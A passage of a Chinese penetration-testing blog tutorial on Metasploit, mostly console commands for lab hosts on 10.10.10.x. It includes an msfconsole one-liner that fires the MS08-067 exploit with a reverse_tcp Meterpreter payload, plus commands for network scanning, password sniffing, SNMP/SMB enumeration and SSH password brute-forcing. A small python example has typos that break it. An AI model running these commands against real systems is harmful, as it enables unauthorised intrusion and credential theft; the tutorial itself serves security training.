+<h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul>
+<li>2015 年11月份，来自社区贡献</li>
+<li>无需运行环境，在客户端运行原生 python 代码</li>
+<li>使用</li>
+</ul>
+<pre><code>meterpreter &gt; load python
+meterpreter &gt; python_execute &quot;print (&#39;asdasdas&#39;)&quot;
+meterpreter &gt; python_execute &quot;import os; cd = os.getcwd()&quot; -r cd
+
+
+
+root@kali:~# cat find2.py 
+import os
+for root,dirs,files in os.walk(c://*):
+    for file in files:
+        if file.endwith(&quot;.ini&quot; ) and file.startwith(&quot;win&quot;):
+            print(os.path.john(root,file))
+python_import -f find.py</code></pre><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul>
+<li>2015 年6月已经被取消</li>
+<li>由 msfconsole -x 取代</li>
+<li>编写脚本时便于引用</li>
+</ul>
+<pre><code>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.147; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.131; set LPORT 5555; set target 34; exploit&quot;</code></pre><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul>
+<li>信息收集的模块都在 auxiliary/scanner/ 之下</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/ [TAB]
+Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul>
+<li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li>
+</ul>
+<pre><code>msf &gt; db_nmap -sV 10.10.10.0/24</code></pre><ul>
+<li>auxiliary 目录下</li>
+<li>RHOSTS &lt;&gt; RHOST<ul>
+<li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li>
+<li>也可以编写地址列表：file:/root/h.txt</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul>
+<li>use auxiliary/scanner/discovery/arp_sweep</li>
+<li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li>
+</ul>
+<pre><code>msf &gt; search arp
+msf &gt; use auxiliary/scanner/discovery/arp_sweep
+msf auxiliary(scanner/discovery/arp_sweep) &gt; show options 
+msf auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 10.10.10.0/24
+msf auxiliary(scanner/discovery/arp_sweep) &gt; set INTERFACE eth0
+msf auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 20
+msf auxiliary(scanner/discovery/arp_sweep) &gt; run</code></pre><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul>
+<li>use auxiliary/scanner/portscan/syn</li>
+<li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li>
+</ul>
+<pre><code>msf &gt; search portscan
+msf &gt; use auxiliary/scanner/portscan/syn
+msf auxiliary(scanner/portscan/syn) &gt; show options 
+msf auxiliary(scanner/portscan/syn) &gt; set INTERFACE eth0
+msf auxiliary(scanner/portscan/syn) &gt; set PORTS 80
+msf auxiliary(scanner/portscan/syn) &gt; set RHOSTS 10.10.10.0/24
+msf auxiliary(scanner/portscan/syn) &gt; set THREADS 50
+msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul>
+<li>查找 ipidseq 主机（查找僵尸机）<ul>
+<li>use auxiliary/scanner/ip/ipidseq</li>
+<li>set RHOSTS 192.168.1.0/24 ；run</li>
+<li>nmap -PN -sI 10.10.10.147 10.10.10.132</li>
+</ul>
+</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/ip/ipidseq
+msf auxiliary(scanner/ip/ipidseq) &gt; show options 
+msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150
+msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20
+msf auxiliary(scanner/ip/ipidseq) &gt; run</code></pre><pre><code>msf &gt; db_nmap -PN -sI 10.10.10.147 10.10.10.132</code></pre><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul>
+<li>use auxiliary/scanner/discovery/udp_sweep</li>
+<li>use auxiliary/scanner/discovery/udp_probe</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/discovery/udp_sweep
+msf auxiliary(scanner/discovery/udp_sweep) &gt; show options 
+msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 10.10.10.100-150
+msf auxiliary(scanner/discovery/udp_sweep) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probe
+msf auxiliary(scanner/discovery/udp_probe) &gt; show options 
+msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150
+msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131
+msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20
+msf auxiliary(scanner/discovery/udp_probe) &gt; run</code></pre><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul>
+<li>use auxiliary/sniffer/psnuffle</li>
+<li>支持从 pacap 抓包文件中提取密码</li>
+<li>功能类似于 dsniff</li>
+<li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li>
+</ul>
+<pre><code>msf &gt; search sniffer
+msf &gt; use auxiliary/sniffer/psnuffle
+msf auxiliary(sniffer/psnuffle) &gt; show options 
+msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0
+msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><pre><code>root@kali:~# ftp 10.10.10.148</code></pre><pre><code># 继续上述
+msf auxiliary(sniffer/psnuffle) &gt; show options
+msf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapng
+msf auxiliary(sniffer/psnuffle) &gt; jobs
+msf auxiliary(sniffer/psnuffle) &gt; kill 0
+msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul>
+<li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li>
+<li>use auxiliary/scanner/snmp/snmp_login</li>
+<li>use auxiliary/scanner/snmp/snmp_enum</li>
+<li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li>
+<li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_login
+msf auxiliary(scanner/snmp/snmp_login) &gt; show options 
+msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149
+msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20
+msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
+msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
+msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149
+msf auxiliary(scanner/snmp/snmp_enum) &gt; run
+</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
+msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
+msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）
+msf auxiliary(scanner/snmp/snmp_enum) &gt; run
+msf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）
+msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20
+msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumusers
+msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options 
+msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadmin
+msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142
+msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumshares
+msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options 
+msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadmin
+msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142
+msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul>
+<li>SMB 版本扫描<ul>
+<li>use auxiliary/scanner/smb/smb_version</li>
+</ul>
+</li>
+<li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul>
+<li>use auxiliary/scanner/smb/pipe_auditor</li>
+</ul>
+</li>
+<li>扫描通过 SMB 管道可以访问的 RCERPC 服务<ul>
+<li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li>
+</ul>
+</li>
+<li>SMB 共享账号（账号、密码）<ul>
+<li>use auxiliary/scanner/smb/smb_enumshares</li>
+</ul>
+</li>
+<li>SMB 用户枚举（账号、密码）<ul>
+<li>use auxiliary/scanner/smb/smb_enumusers</li>
+</ul>
+</li>
+<li>SID 枚举（账号、密码）<ul>
+<li>use auxiliary/scanner/smb/smb_lookupsid</li>
+</ul>
+</li>
+<li>SMB 版本扫描</li>
+</ul>
+<pre><code>msf &gt; search smb
+msf &gt; use auxiliary/scanner/smb/smb_version
+msf auxiliary(scanner/smb/smb_version) &gt; show options 
+msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142
+msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><pre><code># 继续上述
+msf auxiliary(scanner/smb/smb_version) &gt; set SMBUSER Administrator
+msf auxiliary(scanner/smb/smb_version) &gt; set SMBPass 123456
+msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><ul>
+<li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_auditor
+msf auxiliary(scanner/smb/pipe_auditor) &gt; show options 
+msf auxiliary(scanner/smb/pipe_auditor) &gt; set RHOSTS 10.10.10.148
+msf auxiliary(scanner/smb/pipe_auditor) &gt; run</code></pre><pre><code># 继续上述
+msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBUser Administrator
+msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBPass 123456</code></pre><ul>
+<li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditor
+msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show options 
+msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set RHOSTS 10.10.10.148
+msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><pre><code># 继续上述
+msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBUser Administrator
+msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBPass 123456
+msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><ul>
+<li>SMB 共享账号（账号、密码）</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumshares
+msf auxiliary(scanner/smb/smb_enumshares) &gt; show options 
+msf auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.148
+msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><pre><code># 继续上述
+msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUser Administrator
+msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPass 123456
+msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><ul>
+<li>SMB 用户枚举（账号、密码）</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumusers
+msf auxiliary(scanner/smb/smb_enumusers) &gt; show options 
+msf auxiliary(scanner/smb/smb_enumusers) &gt; set RHOSTS 10.10.10.148
+msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><pre><code># 继续上述
+msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBUser Administrator
+msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBPass 123456
+msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><ul>
+<li>SID 枚举（账号、密码）</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/smb/smb_lookupsid
+msf auxiliary(scanner/smb/smb_lookupsid) &gt; show options 
+msf auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.148</code></pre><pre><code># 继续上述
+msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser Administrator
+msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass 123456
+msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul>
+<li>SSH 版本扫描<ul>
+<li>use auxiliary/scanner/ssh/ssh_version</li>
+</ul>
+</li>
+<li>SSH 密码爆破<ul>
+<li>use auxiliary/scanner/ssh/ssh_login<ul>
+<li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SSH 公钥登陆<ul>
+<li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul>
+<li>set KEY_FILE id_rsa；set USERNAME root ；run</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SSH 版本扫描</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_version
+msf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132
+msf auxiliary(scanner/ssh/ssh_version) &gt; run</code></pre><ul>
+<li>SSH 密码爆破</li>
+</ul>
+<pre><code>root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt 
+
+msf &gt; use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132
+msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+msf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false 
+msf auxiliary(scanner/ssh/ssh_login) &gt; run</code></pre><ul>
+<li>SSH 公钥登陆</li>
+</ul>
+<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey
+msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132
+msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME root
+msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</code></pre><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul>
+<li><p>基于已经取得的 session 进行检测</p>
+</li>
+<li><p>use post/windows/gather/enum_patches</p>
+<ul>
+<li>show advanced</li>
+<li>set VERBOSE yes</li>
+</ul>
+</li>
+<li><p>检查失败</p>
+<ul>
+<li>known bug in WMI query, try migrating to another process</li>
+<li>迁移到另一个进程再次进行尝试</li>
+</ul>
+</li>
+<li><p>ms08-067</p>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/" rel="next" title="“文件上传漏洞学习">
+                <i class="fa fa-chevron-left"></i> “文件上传漏洞学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/" rel="prev" title="渗透测试——拒绝服务">
+                渗透测试——拒绝服务 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Shu1L</p>
+              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试——Mestasploit-基本使用"><span class="nav-number">1.</span> <span class="nav-text">渗透测试——Mestasploit 基本使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#渗透测试者的困扰"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">渗透测试者的困扰</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Metasploit-简介"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">Metasploit 简介</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Metasploit-架构"><span class="nav-number">1.0.1.</span> <span class="nav-text">Metasploit 架构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基本使用"><span class="nav-number">1.0.2.</span> <span class="nav-text">基本使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-Exploit-模块"><span class="nav-number">1.0.3.</span> <span class="nav-text">5. Exploit 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-Active-exploit"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">1.Active exploit</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-Passive-Exploits"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">2. Passive Exploits</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-生成payload"><span class="nav-number">1.0.4.</span> <span class="nav-text">6.生成payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-metepreter"><span class="nav-number">1.0.5.</span> <span class="nav-text">7. metepreter</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-简介"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">1.简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-使用"><span class="nav-number">1.0.5.2.</span> <span class="nav-text">2.使用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Meterpreter-python-扩展"><span class="nav-number">1.0.6.</span> <span class="nav-text">Meterpreter python 扩展</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-msfcli"><span class="nav-number">1.0.7.</span> <span class="nav-text">9. msfcli</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mestasploit-信息收集"><span class="nav-number">1.1.</span> <span class="nav-text">Mestasploit 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#模块位置："><span class="nav-number">1.1.0.1.</span> <span class="nav-text">模块位置：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-db-nmap"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. db_nmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-主机发现扫描"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.主机发现扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-端口扫描"><span class="nav-number">1.1.3.</span> <span class="nav-text">3.端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-僵尸扫描"><span class="nav-number">1.1.4.</span> <span class="nav-text">4.僵尸扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-UDP扫描"><span class="nav-number">1.1.5.</span> <span class="nav-text">5.UDP扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-密码嗅探"><span class="nav-number">1.1.6.</span> <span class="nav-text">6.密码嗅探</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-SNMP扫描"><span class="nav-number">1.1.7.</span> <span class="nav-text">7.SNMP扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-SMB扫描"><span class="nav-number">1.1.8.</span> <span class="nav-text">8.SMB扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH扫描"><span class="nav-number">1.1.9.</span> <span class="nav-text">SSH扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#windows缺少的补丁"><span class="nav-number">1.1.10.</span> <span class="nav-text">windows缺少的补丁</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shu1L</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
